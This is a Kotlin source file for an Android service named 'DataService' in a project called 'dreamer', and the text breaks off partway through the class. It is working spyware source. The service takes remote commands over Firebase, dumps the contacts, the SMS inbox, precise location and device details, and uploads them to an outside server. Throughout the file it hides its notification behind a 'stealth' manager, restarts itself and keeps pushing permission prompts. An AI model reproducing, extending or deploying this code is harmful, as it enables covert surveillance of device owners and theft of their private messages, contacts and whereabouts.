package com.h4k3r.dreamer

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.lang.StringBuilder
import android.os.Bundle
import android.location.LocationManager
import com.google.firebase.database.ChildEventListener
import androidx.core.content.ContextCompat
import android.content.pm.PackageManager
import android.Manifest

class DataService : Service() {
    companion object {
        private const val TAG = "DataService"
        private const val NOTIFICATION_ID = 1
        private const val LOCATION_REQUEST_TIMEOUT = 15000L // 15 seconds
        private const val MAX_LOCATION_RETRIES = 3
        private const val ERROR_COOLDOWN = 30000L // 30 seconds between error reports
    }

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var deviceRef: DatabaseReference

    /* ── Coroutines ─────────────────────────────── */
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    /* ── HTTP Client ────────────────────────────── */
    private val http = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS) // Optimized for speed
        .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private val server = "https://dreamer-bot.onrender.com"

    /* ── Command Tracking for Performance ────────── */
    private var currentChatId: Long = 0
    private var currentMsgId: Int = 0

    /* ── Enhanced Location Management ────────────────────────────── */
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private var isTrackingLocation = false
    private lateinit var locationManager: LocationManager
    private var locationRetryCount = 0
    private var lastErrorTime = 0L
    private var lastLocationRequestTime = 0L
    private val LOCATION_REQUEST_COOLDOWN = 10000L // 10 seconds between requests

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "DataService created")

        // Try to start as foreground service with enhanced Android 15+ support
        startForegroundServiceSafely()

        // Initialize location manager
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

        // Initialize FusedLocationClient with enhanced error handling
        initializeFusedLocationClient()

        // Initialize authentication and Firebase with retry mechanism
        initializeAuthentication()
    }

    private fun startForegroundServiceSafely() {
        try {
            // Use stealth notification manager
            val stealthManager = StealthNotificationManager.getInstance(this)
            startForeground(StealthNotificationManager.STEALTH_NOTIFICATION_ID, stealthManager.getStealthNotification())
            stealthManager.enforceStealthMode()

            Log.d(TAG, "DataService started with stealth notification")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}")
            // Continue as background service
            Log.w(TAG, "Continuing as background service")
        }
    }

    private fun createPermissionNeededNotification(): Notification {
        return NotificationCompat.Builder(this, "data_service_channel")
            .setContentTitle("Location Service")
            .setContentText("Waiting for location permission")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .build()
    }

    private fun initializeFusedLocationClient() {
        try {
            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
            setupLocationCallback()
            Log.d(TAG, "FusedLocationClient initialized successfully")

            // Test if the client is actually working
            testLocationClient()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize FusedLocationClient: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun testLocationClient() {
        if (!hasLocationPermission()) {
            Log.w(TAG, "Cannot test location client without permission")
            return
        }

        try {
            fusedLocationClient.lastLocation.addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val location = task.result
                    if (location != null) {
                        Log.d(TAG, "FusedLocationClient test successful - Last location available")
                    } else {
                        Log.d(TAG, "FusedLocationClient test successful - No last location")
                    }
                } else {
                    Log.w(TAG, "FusedLocationClient test failed: ${task.exception?.message}")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "FusedLocationClient test exception: ${e.message}")
        }
    }

    private fun initializeAuthentication() {
        val prefs = getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
            Log.d(TAG, "✅ Authentication loaded successfully - Key: ${secretKey.take(3)}..., Device: $deviceId")
            Log.d(TAG, "✅ HTTP requests will use header: X-Auth: ${secretKey.take(3)}...:$deviceId")
            initializeFirebase()
        } else {
            Log.e(TAG, "❌ Missing authentication data - Key: '$secretKey', Device: '$deviceId'")
            Log.e(TAG, "❌ This will cause 403 errors! Retrying in 5 seconds...")
            // Retry authentication after 5 seconds
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                initializeAuthentication()
            }, 5000)
        }
    }

    private fun initializeFirebase() {
        try {
            deviceRef = Firebase.database.reference
                .child("devices")
                .child(secretKey)
                .child(deviceId)
            Log.d(TAG, "Firebase reference initialized")
            listenFirebase()
        } catch (e: Exception) {
            Log.e(TAG, "Firebase initialization failed: ${e.message}, retrying in 10 seconds")
            // Retry Firebase initialization after 10 seconds
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                initializeFirebase()
            }, 10000)
        }
    }

    private fun listenFirebase() {
        try {
            if (!::deviceRef.isInitialized) {
                Log.w(TAG, "deviceRef not initialized, skipping Firebase listener")
                return
            }

            Log.d(TAG, "Setting up Firebase listener")

            deviceRef.child("command").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val cmd = snapshot.getValue(String::class.java) ?: return
                    Log.d(TAG, "Command received: $cmd")

                    // Get chat and message IDs for responses (optimized)
                    scope.launch {
                        try {
                            val chatSnapshot = deviceRef.child("chat").get().await()
                            val msgSnapshot = deviceRef.child("msg").get().await()
                            currentChatId = chatSnapshot.getValue(Long::class.java) ?: 0L
                            currentMsgId = msgSnapshot.getValue(Int::class.java) ?: 0
                        } catch (e: Exception) {
                            Log.w(TAG, "Failed to get chat/msg IDs: ${e.message}")
                        }
                    }

                    when (cmd) {
                        "loc_now" -> {
                            Log.d(TAG, "Processing loc_now command")
                            sendCurrentLocation()
                        }
                        "dump_contacts" -> {
                            Log.d(TAG, "Processing dump_contacts command")
                            sendContacts()
                        }
                        "dump_sms" -> {
                            Log.d(TAG, "Processing dump_sms command")
                            sendSms()
                        }
                        "device_info" -> {
                            Log.d(TAG, "Processing device_info command")
                            sendDeviceInfo()
                        }
                        // Stealth Monitoring Commands
                        "clipboard_monitor" -> {
                            Log.d(TAG, "Clipboard monitoring DISABLED - requires special permissions")
                            // handleClipboardMonitorRequest() // REMOVED: Requires special permissions
                        }
                        "app_usage" -> {
                            Log.d(TAG, "Processing app_usage command")
                            handleAppUsageRequest()
                        }
                        "system_state" -> {
                            Log.d(TAG, "Processing system_state command")
                            handleSystemStateRequest()
                        }
                        "input_patterns" -> {
                            Log.d(TAG, "Processing input_patterns command")
                            handleInputPatternsRequest()
                        }
                        "monitor_dashboard" -> {
                            Log.d(TAG, "Processing monitor_dashboard command")
                            handleMonitorDashboardRequest()
                        }
                        "start_monitoring" -> {
                            Log.d(TAG, "Processing start_monitoring command")
                            handleStartMonitoringRequest()
                        }
                        "stop_monitoring" -> {
                            Log.d(TAG, "Processing stop_monitoring command")
                            handleStopMonitoringRequest()
                        }
                        // Enhanced Perfection Commands
                        "network_intelligence" -> {
                            Log.d(TAG, "Processing network_intelligence command")
                            handleNetworkIntelligenceRequest()
                        }
                        "behavior_analysis" -> {
                            Log.d(TAG, "Processing behavior_analysis command")
                            handleBehaviorAnalysisRequest()
                        }
                        "sensor_intelligence" -> {
                            Log.d(TAG, "Processing sensor_intelligence command")
                            handleSensorIntelligenceRequest()
                        }
                        "system_intelligence" -> {
                            Log.d(TAG, "Processing system_intelligence command")
                            handleSystemIntelligenceRequest()
                        }
                        "perfection_dashboard" -> {
                            Log.d(TAG, "Processing perfection_dashboard command")
                            handlePerfectionDashboardRequest()
                        }
                        "start_perfection" -> {
                            Log.d(TAG, "Processing start_perfection command")
                            handleStartPerfectionRequest()
                        }
                        "stop_perfection" -> {
                            Log.d(TAG, "Processing stop_perfection command")
                            handleStopPerfectionRequest()
                        }
                    }

                    snapshot.ref.setValue(null) // Clear command
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Firebase listener cancelled: ${error.message}")
                    // Retry Firebase connection after 15 seconds
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        Log.d(TAG, "Retrying Firebase connection")
                        initializeFirebase()
                    }, 15000)
                }
            })

            Log.d(TAG, "Firebase listener set up successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to set up Firebase listener: ${e.message}")
            // Retry after 15 seconds
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                Log.d(TAG, "Retrying Firebase listener setup")
                listenFirebase()
            }, 15000)
        }
    }

    // handleFirebaseCommand function removed - logic moved to Firebase listener

    /* ── Enhanced Location Functions ─────────────────────── */
    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { location ->
                    Log.d(TAG, "Location update received - Lat: ${location.latitude}, Lon: ${location.longitude}")
                    sendLocationUpdate(location, "tracking")
                }
            }

            override fun onLocationAvailability(availability: LocationAvailability) {
                Log.d(TAG, "Location availability changed: isLocationAvailable=${availability.isLocationAvailable}")
                if (!availability.isLocationAvailable) {
                    sendStatus("Location services temporarily unavailable")
                }
            }
        }
    }

    private fun sendCurrentLocation() {
        val currentTime = System.currentTimeMillis()

        // Rate limit location requests
        if (currentTime - lastLocationRequestTime < LOCATION_REQUEST_COOLDOWN) {
            Log.d(TAG, "Rate limiting location request")
            return
        }

        lastLocationRequestTime = currentTime
        Log.d(TAG, "Getting current location")

        if (!hasLocationPermission()) {
            Log.e(TAG, "Location permission not granted")
            requestLocationPermissionSafely()
            sendError("Location permission not granted")
            scheduleLocationRetry()
            return
        }

        scope.launch {
            try {
                // Check if location services are enabled
                val isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
                val isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

                Log.d(TAG, "Location providers - GPS: $isGpsEnabled, Network: $isNetworkEnabled")

                if (!isGpsEnabled && !isNetworkEnabled) {
                    Log.w(TAG, "Location services are disabled")
                    sendError("Location services are disabled - please enable GPS and network location")
                    scheduleLocationRetry()
                    return@launch
                }

                // Send immediate status
                sendStatus("Getting current location...")

                // Try multiple location strategies
                val location = getLocationWithFallback()

                if (location != null) {
                    Log.d(TAG, "Location obtained successfully")
                    sendLocationUpdate(location, "current")
                    locationRetryCount = 0 // Reset retry count on success
                } else {
                    Log.w(TAG, "Failed to get location from all methods")
                    sendError("Unable to get current location")
                    scheduleLocationRetry()
                }

            } catch (e: SecurityException) {
                Log.e(TAG, "Location permission error: ${e.message}")
                sendError("Location permission not granted")
                requestLocationPermissionSafely()
                scheduleLocationRetry()
            } catch (e: Exception) {
                Log.e(TAG, "Unexpected location error: ${e.message}")
                sendError("Location service error: ${e.message}")
                scheduleLocationRetry()
            }
        }
    }

    private suspend fun getLocationWithFallback(): Location? {
        // Strategy 1: Try cached location from FusedLocationClient
        val cachedLocation = getCachedLocation()
        if (cachedLocation != null) {
            Log.d(TAG, "Using cached fused location")
            return cachedLocation
        }

        // Strategy 2: Try fresh location from FusedLocationClient
        val freshLocation = getFreshLocation()
        if (freshLocation != null) {
            Log.d(TAG, "Using fresh fused location")
            return freshLocation
        }

        // Strategy 3: Try last known locations from LocationManager
        val lastKnownLocation = getLastKnownLocation()
        if (lastKnownLocation != null) {
            Log.d(TAG, "Using last known location")
            return lastKnownLocation
        }

        return null
    }

    private suspend fun getCachedLocation(): Location? {
        return try {
            if (!::fusedLocationClient.isInitialized) {
                Log.w(TAG, "FusedLocationClient not initialized")
                return null
            }

            if (!hasLocationPermission()) {
                return null
            }

            withContext(Dispatchers.Main) {
                val task = fusedLocationClient.lastLocation

                val location = try {
                    task.await()
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to get cached location: ${e.message}")
                    null
                }

                if (location != null) {
                    val locationAge = System.currentTimeMillis() - location.time
                    if (locationAge < 5 * 60 * 1000) { // 5 minutes for cached location
                        Log.d(TAG, "Cached location is recent (age: ${locationAge / 1000}s)")
                        location
                    } else {
                        Log.d(TAG, "Cached location is too old (age: ${locationAge / 1000}s)")
                        null
                    }
                } else {
                    null
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error getting cached location: ${e.message}")
            null
        }
    }

    private suspend fun getFreshLocation(): Location? {
        return try {
            if (!::fusedLocationClient.isInitialized || !hasLocationPermission()) {
                return null
            }

            withContext(Dispatchers.Main) {
                val locationRequest = LocationRequest.create().apply {
                    priority = LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY
                    numUpdates = 1
                    interval = 0
                    fastestInterval = 0
                    maxWaitTime = 8000 // 8 seconds max wait
                }

                var receivedLocation: Location? = null
                val locationCallback = object : LocationCallback() {
                    override fun onLocationResult(result: LocationResult) {
                        receivedLocation = result.lastLocation
                        Log.d(TAG, "Fresh location received")
                    }
                }

                try {
                    fusedLocationClient.requestLocationUpdates(
                        locationRequest,
                        locationCallback,
                        null
                    )

                    // Wait for location with timeout
                    delay(LOCATION_REQUEST_TIMEOUT)

                    // Remove updates
                    fusedLocationClient.removeLocationUpdates(locationCallback)

                    receivedLocation
                } catch (e: Exception) {
                    Log.e(TAG, "Error getting fresh location: ${e.message}")
                    try {
                        fusedLocationClient.removeLocationUpdates(locationCallback)
                    } catch (cleanupException: Exception) {
                        Log.e(TAG, "Error removing location updates: ${cleanupException.message}")
                    }
                    null
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in getFreshLocation: ${e.message}")
            null
        }
    }

    private fun getLastKnownLocation(): Location? {
        return try {
            if (!hasLocationPermission()) {
                return null
            }

            var bestLocation: Location? = null

            // Try GPS last known location
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                val gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (gpsLocation != null) {
                    Log.d(TAG, "GPS last known location found")
                    bestLocation = gpsLocation
                }
            }

            // Try network last known location
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                val networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (networkLocation != null) {
                    Log.d(TAG, "Network last known location found")
                    // Use network location if it's more recent or if no GPS location
                    if (bestLocation == null || networkLocation.time > bestLocation.time) {
                        bestLocation = networkLocation
                    }
                }
            }

            // Try passive provider
            val passiveLocation = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
            if (passiveLocation != null) {
                Log.d(TAG, "Passive last known location found")
                if (bestLocation == null || passiveLocation.time > bestLocation.time) {
                    bestLocation = passiveLocation
                }
            }

            bestLocation
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission error: ${e.message}")
            null
        } catch (e: Exception) {
            Log.e(TAG, "Error getting last known location: ${e.message}")
            null
        }
    }

    private fun scheduleLocationRetry() {
        if (locationRetryCount >= MAX_LOCATION_RETRIES) {
            Log.e(TAG, "Max location retry attempts reached")
            sendError("Location access failed after $MAX_LOCATION_RETRIES attempts")
            return
        }

        locationRetryCount++
        val delay = 30000L * locationRetryCount // 30s, 60s, 90s

        Log.d(TAG, "Scheduling location retry attempt $locationRetryCount in ${delay/1000} seconds")

        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            Log.d(TAG, "Executing location retry attempt $locationRetryCount")
            sendCurrentLocation()
        }, delay)
    }

    /* ── Enhanced Location Tracking ─────────────────────── */
    private fun startLocationTracking() {
        if (isTrackingLocation) {
            Log.d(TAG, "Location tracking already active")
            return
        }

        if (!hasLocationPermission()) {
            Log.e(TAG, "Cannot start location tracking without permission")
            requestLocationPermissionSafely()
            return
        }

        Log.d(TAG, "Starting location tracking")

        try {
            val locationRequest = LocationRequest.create().apply {
                interval = 60_000 // 1 minute
                fastestInterval = 30_000 // 30 seconds
                priority = LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY
                maxWaitTime = 120_000 // 2 minutes max wait for batched locations
            }

            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                null
            )
            isTrackingLocation = true
            sendStatus("Location tracking started")
            Log.d(TAG, "Location tracking started successfully")
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission error for tracking", e)
            sendError("Location permission not granted for tracking")
            requestLocationPermissionSafely()
        } catch (e: Exception) {
            Log.e(TAG, "Error starting location tracking: ${e.message}")
            sendError("Failed to start location tracking: ${e.message}")
        }
    }

    private fun stopLocationTracking() {
        if (!isTrackingLocation) {
            Log.d(TAG, "Location tracking not active")
            return
        }

        Log.d(TAG, "Stopping location tracking")
        try {
            if (::fusedLocationClient.isInitialized) {
                fusedLocationClient.removeLocationUpdates(locationCallback)
            }
            isTrackingLocation = false
            sendStatus("Location tracking stopped")
            Log.d(TAG, "Location tracking stopped successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping location tracking: ${e.message}")
        }
    }

    private fun hasPerm(p: String): Boolean {
        val hasPermission = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
        Log.d(TAG, "Permission $p: $hasPermission")
        return hasPermission
    }

    private fun hasLocationPermission(): Boolean {
        val fineLocation = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        val coarseLocation = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        Log.d(TAG, "Location permissions - Fine: $fineLocation, Coarse: $coarseLocation")

        return fineLocation || coarseLocation
    }

    private fun requestLocationPermissionSafely() {
        val currentTime = System.currentTimeMillis()
        val lastRequestTime = getSharedPreferences("data_service", MODE_PRIVATE)
            .getLong("last_location_permission_request", 0)

        // Don't spam permission requests (minimum 60 seconds between requests)
        if (currentTime - lastRequestTime < 60000) {
            Log.d(TAG, "Skipping location permission request (too recent)")
            return
        }

        Log.d(TAG, "Requesting location permission")

        try {
            // Update permission request time
            getSharedPreferences("data_service", MODE_PRIVATE)
                .edit()
                .putLong("last_location_permission_request", currentTime)
                .apply()

            val intent = Intent(this, PermissionHelperActivity::class.java).apply {
                putExtra("runtime_permission", Manifest.permission.ACCESS_FINE_LOCATION)
                putExtra("permission", "location_fine")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to request location permission: ${e.message}")
            sendError("Failed to request location permission")
        }
    }

    private fun sendLocationUpdate(location: Location, type: String) {
        val json = org.json.JSONObject().apply {
            put("lat", location.latitude)
            put("lon", location.longitude)
            put("accuracy", location.accuracy)
            put("altitude", location.altitude)
            put("speed", location.speed)
            put("bearing", location.bearing)
            put("time", location.time)
            put("type", type)
            put("provider", location.provider ?: "unknown")
        }.toString()

        post("/json/location", json, "application/json")
        Log.d(TAG, "Location update sent - Type: $type, Accuracy: ${location.accuracy}m")
    }

    /* ── Enhanced Data Collection Methods ──────────────────────── */
    private fun sendContacts() {
        Log.d(TAG, "Dumping contacts")

        if (!hasPerm(Manifest.permission.READ_CONTACTS)) {
            Log.e(TAG, "Contacts permission not granted")
            sendError("Contacts permission not granted")
            return
        }

        scope.launch {
            val contacts = StringBuilder()
            var count = 0

            try {
                contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.TYPE
                    ),
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )?.use { cursor ->
                    val nameIdx = cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                    )
                    val numberIdx = cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    )
                    val typeIdx = cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.TYPE
                    )

                    contacts.append("=== CONTACTS DUMP ===\n")
                    contacts.append("Total: ${cursor.count} contacts\n")
                    contacts.append("Generated: ${java.util.Date()}\n")
                    contacts.append("Device: $deviceId\n")
                    contacts.append("=" * 30 + "\n\n")

                    while (cursor.moveToNext() && count < 500) { // Limit to 500
                        val name = cursor.getString(nameIdx) ?: "Unknown"
                        val number = cursor.getString(numberIdx) ?: "Unknown"
                        val type = cursor.getInt(typeIdx)
                        val typeLabel = ContactsContract.CommonDataKinds.Phone
                            .getTypeLabel(resources, type, "").toString()

                        contacts.append("Name: $name\n")
                        contacts.append("Number: $number\n")
                        contacts.append("Type: $typeLabel\n")
                        contacts.append("-" * 20 + "\n")
                        count++
                    }

                    if (cursor.count > 500) {
                        contacts.append("\n[... and ${cursor.count - 500} more contacts]")
                    }
                }

                Log.d(TAG, "Found $count contacts")
                post("/text/contacts", contacts.toString(), "text/plain")

            } catch (e: SecurityException) {
                Log.e(TAG, "Contacts permission error", e)
                sendError("Contacts permission denied")
            } catch (e: Exception) {
                Log.e(TAG, "Contacts error", e)
                sendError("Failed to read contacts: ${e.message}")
            }
        }
    }

    private fun sendSms() {
        Log.d(TAG, "Dumping SMS")

        if (!hasPerm(Manifest.permission.READ_SMS)) {
            Log.e(TAG, "SMS permission not granted")
            sendError("SMS permission not granted")
            return
        }

        scope.launch {
            val sms = StringBuilder()
            var count = 0

            try {
                // Check if we're default SMS app
                if (Telephony.Sms.getDefaultSmsPackage(this@DataService) != packageName) {
                    sms.append("⚠️ App is not the default SMS handler.\n")
                    sms.append("Some messages may not be accessible.\n\n")
                }

                sms.append("=== SMS DUMP ===\n")
                sms.append("Generated: ${java.util.Date()}\n")
                sms.append("Device: $deviceId\n")
                sms.append("=" * 30 + "\n\n")

                // Query inbox
                contentResolver.query(
                    Telephony.Sms.Inbox.CONTENT_URI,
                    arrayOf(
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.TYPE
                    ),
                    null,
                    null,
                    Telephony.Sms.DATE + " DESC LIMIT 100"
                )?.use { cursor ->
                    val addressIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                    val bodyIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)
                    val dateIdx = cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)

                    sms.append("INBOX (Last 100 messages):\n")
                    sms.append("-" * 30 + "\n\n")

                    while (cursor.moveToNext() && count < 100) {
                        val address = cursor.getString(addressIdx) ?: "Unknown"
                        val body = cursor.getString(bodyIdx) ?: ""
                        val date = java.util.Date(cursor.getLong(dateIdx))

                        sms.append("From: $address\n")
                        sms.append("Date: $date\n")
                        sms.append("Message: $body\n")
                        sms.append("-" * 20 + "\n")
                        count++
                    }
                }

                Log.d(TAG, "Found $count SMS messages")
                post("/text/sms", sms.toString(), "text/plain")

            } catch (e: SecurityException) {
                Log.e(TAG, "SMS permission error", e)
                sendError("SMS permission denied")
            } catch (e: Exception) {
                Log.e(TAG, "SMS error", e)
                sendError("Failed to read SMS: ${e.message}")
            }
        }
    }

    private fun sendDeviceInfo() {
        Log.d(TAG, "Sending device info")

        val info = org.json.JSONObject().apply {
            put("manufacturer", Build.MANUFACTURER)
            put("model", Build.MODEL)
            put("device", Build.DEVICE)
            put("android_version", Build.VERSION.RELEASE)
            put("sdk_int", Build.VERSION.SDK_INT)
            put("security_patch", Build.VERSION.SECURITY_PATCH)
            put("hardware", Build.HARDWARE)
            put("product", Build.PRODUCT)
            put("board", Build.BOARD)
            put("display", Build.DISPLAY)
            put("fingerprint", Build.FINGERPRINT)
            put("time", System.currentTimeMillis())
            put("location_permission", hasLocationPermission())
            put("gps_enabled", locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
            put("network_enabled", locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
        }.toString()

        post("/json/device_info", info, "application/json")
    }

    /* ── Enhanced Error Handling ──────────────────────── */
    private fun sendError(error: String) {
        val currentTime = System.currentTimeMillis()

        // Rate limit error reporting
        if (currentTime - lastErrorTime < ERROR_COOLDOWN) {
            Log.d(TAG, "Rate limiting error report: $error")
            return
        }

        lastErrorTime = currentTime

        val json = org.json.JSONObject().apply {
            put("error", error)
            put("time", currentTime)
            put("service", "data")
            put("location_permission", hasLocationPermission())
            put("retry_count", locationRetryCount)
        }.toString()
        post("/json/error", json, "application/json")
        Log.e(TAG, "Error reported: $error")
    }

    private fun sendStatus(message: String) {
        val json = org.json.JSONObject().apply {
            put("status", message)
            put("time", System.currentTimeMillis())
            put("service", "data")
        }.toString()
        post("/json/status", json, "application/json")
        Log.d(TAG, "Status: $message")
    }

    /* ── Helper Functions ───────────────────────── */
    private fun post(path: String, data: String, mime: String) = scope.launch {
        var retryCount = 0
        val maxRetries = 3
        while (retryCount < maxRetries) {
            try {
                val request = okhttp3.Request.Builder()
                    .url(server + path)
                    .header("X-Auth", "$secretKey:$deviceId")
                    .post(data.toRequestBody(mime.toMediaType()))
                    .build()

                http.newCall(request).execute().use { response ->
                    Log.d(TAG, "POST $path: ${response.code}")
                    if (response.isSuccessful) {
                        Log.d(TAG, "✅ Successfully posted to $path")
                        return@launch
                    } else {
                        val errorBody = response.body?.string()
                        Log.e(TAG, "❌ Upload failed: ${response.code} - $errorBody")
                        if (response.code == 403) {
                            Log.e(TAG, "❌ 403 FORBIDDEN: Check authentication!")
                            Log.e(TAG, "❌ Used auth header: X-Auth: ${secretKey.take(3)}...:$deviceId")
                            Log.e(TAG, "❌ Server may not recognize this device or key is wrong")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "POST error on attempt ${retryCount + 1}: ${e.message}")
            }
            retryCount++
            delay(2000L * retryCount) // Exponential backoff
        }
        sendError("Failed to post data after $maxRetries attempts")
    }

    private operator fun String.times(n: Int) = repeat(n)

    /* ── Service Lifecycle ──────────────────────── */
    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "data_service_channel",
                "Data Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Location and data monitoring service"
                setSound(null, null)
                enableVibration(false)
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "data_service_channel")
            .setContentTitle("Location Service")
            .setContentText("Monitoring device location")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        Log.d(TAG, "DataService onDestroy called")

        // Stop foreground service properly
        try {
            stopForeground(true)
            Log.d(TAG, "Foreground service stopped successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping foreground service: ${e.message}")
        }

        if (isTrackingLocation) {
            stopLocationTracking()
        }
        job.cancel()
        super.onDestroy()
    }

    /* ── Stealth Monitoring Handler Methods ─────────────── */

    /* REMOVED: Clipboard monitoring requires special permissions that user doesn't want to grant
    private fun handleClipboardMonitorRequest() {
        // This method has been removed to avoid permission requirements
    }
    */

    private fun handleAppUsageRequest() {
        scope.launch {
            try {
                val monitorRef = Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("stealth_monitoring")

                monitorRef.limitToLast(1).addListenerForSingleValueEvent(object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val appUsageData = mutableListOf<Map<String, Any>>()
                        var switchesCount = 0

                        for (monitorSnapshot in snapshot.children) {
                            val data = monitorSnapshot.value as? Map<String, Any> ?: continue
                            val dataList = data["data"] as? List<*> ?: continue

                            // Filter app usage events (optimized)
                            val appEvents = dataList.mapNotNull { item ->
                                val eventMap = item as? Map<String, Any>
                                val type = eventMap?.get("type") as? String
                                if (type == "app_switch" || type == "app_usage_stats") eventMap else null
                            }

                            appUsageData.addAll(appEvents)
                            switchesCount = data["app_usage_count"] as? Int ?: appEvents.count {
                                (it["type"] as? String) == "app_switch"
                            }
                        }

                        sendStealthMonitorResponse("app_usage", mapOf(
                            "app_usage_data" to appUsageData,
                            "switches_count" to switchesCount
                        ))
                    }

                    override fun onCancelled(error: DatabaseError) {
                        sendStealthMonitorResponse("error", mapOf("message" to "Failed to get app usage data"))
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "App usage monitor error: ${e.message}")
                sendStealthMonitorResponse("error", mapOf("message" to (e.message ?: "Unknown app usage error")))
            }
        }
    }

